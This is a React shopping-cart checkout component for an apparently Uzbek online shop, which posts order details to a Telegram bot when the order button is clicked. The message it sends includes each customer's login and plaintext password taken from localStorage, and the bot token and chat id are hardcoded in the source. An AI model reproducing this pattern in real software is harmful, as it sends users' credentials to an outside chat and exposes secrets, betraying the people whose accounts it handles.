import React, { useContext } from "react";
import { useCart } from "react-use-cart";
import axios from "axios";
import "../Korzinka/Korzinka.scss";
import { Context } from "../../Contex";
const Korzinka = () => {
  let total = 0;
  const { user, pass, name, number } = useContext(Context);
  const { items, isEmpty, updateItemQuantity, removeItem } = useCart();
  const postTest = () => {
    const userCheck = JSON.parse(localStorage.getItem("auth"));
    if (userCheck) {
      axios.post(
        `https://api.telegram.org/bot6043609597:AAEdM2BmdZ9kvFkOVHAafU9WDgn20uwYfdY/sendMessage?chat_id=-859990185&text=${encodeURIComponent(
          `<b>Details:</b>
      
          <b>The operation was completed successfully!</b>
          <b>our couriers will contact you soon! Ibrohim</b>
          <b> Call Center: +998 99 946 45 99 </b>
          <b> Name: ${userCheck.name} </b>
          <b> User: ${userCheck.login} </b>
          <b> Password: ${userCheck.pass} </b>
          ${items
            .map((item) => {
              return ` <b>${item.name}</b> ${item.count} x ${item.price} som = ${item.count} `;
            })
            .join("")}  
            
            <b>Total:</b> ${total} som`
        )}&parse_mode=html`
      );
    } else {
      window.location.replace("/");
    }
  };

  return (
    <>
     
      <div className="container1">
        <div className="klmn">
          <div className="divvvs">
            {isEmpty ? <h1 className="ddd"> There is nothing </h1> : null}
            {items.map((item) => {
              const prCount = item.count * item.price;
              total += prCount;

              if (item.count >= 1) {
                return (
                  <div   className="iiii">
                    <div className="carddd" data-aos="fade-right" key={item.id}>
                      <div className="left">
                        <img className="imggg" src={item.image} alt="" />
                     
                      </div>
                      <div className="right">
                        <div className="text">
                         
                          <h1 className="h1">{item.title}</h1>
                          <hr />
                          <p className="texts__p">{item.fulldesc}</p>
                     
                          <p className="texts_price">{item.price} som </p>
                        </div>
                        <div className="clicks">
                          <div className="btns">
                            <button
                              onClick={() =>
                                updateItemQuantity(item.id, item.count++)
                              }
                              className="btn_plus"
                            >
                              +
                            </button>

                            <p className="p">{prCount} som </p>
                            <button
                              className="btn_plus"
                              onClick={() =>
                                updateItemQuantity(item.id, item.count--)
                              }
                            >
                              -
                            </button>
                          </div>
                          <h1
                            onClick={() => removeItem(item.id)}
                            className="delete"
                          >
                            Delete
                          </h1>
                        </div>
                      </div>
                    </div>
                  </div>
                );
              } else {
                removeItem(item.id);
              }
            })}
          </div>
          <div className="btnd" data-aos="fade-up">
            <img
              className="h11"
              // src={Logo}
              alt=""
            />
            <div className="oplata">
              <h1 className="hh1"> Everything - </h1>
              <h1 className="obshi">{total} som </h1>
            </div>
            <div className="oplata">
              <h1 className="hh1"> Delivery - </h1>
              <h1 className="obshi"> 0 $</h1>
            </div>
            <button
              onClick={() => {
                postTest();
              }}
              className="zakaz_btn"
              data-mdb-toggle="modal"
              data-mdb-target="#exampleModal"
              type="button"
            >
              {" "}
              Click
            </button>
            </div>
            <div
              class="modal fade"
              id="exampleModal"
              data-mdb-toggle="modal"
              data-mdb-target="#exampleModal"
            >
              <div class="modal-dialog">
                <div class="modal-content">
                  <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">
                      <img
                        style={{ width: "150px", marginLeft: "150px" }}
                        // src={Logo}
                        alt=""
                      />
                    </h5>
                    <button
                      type="button"
                      class="btn-close"
                      data-mdb-dismiss="modal"
                      aria-label="Close"
                    ></button>
                  </div>
                  <div class="modal-body">
                    Your request has been accepted. Our administrator will
                    contact you 🙂👍🏻 <br />
                    <span style={{textAlign:"center", color: "red", fontWeight: "800" }}>
                      Please wait
                    </span>
                  </div>
                  <div class="modal-footer">
                    <button
                      style={{ width: "100%", fontWeight: "700" }}
                      type="button"
                      class="btn btn-danger"
                    >
                      Ok
                    </button>
                  </div>
                </div>
              </div>
            </div>
        </div>
      </div>

     
    </>
  );
};

export default Korzinka;
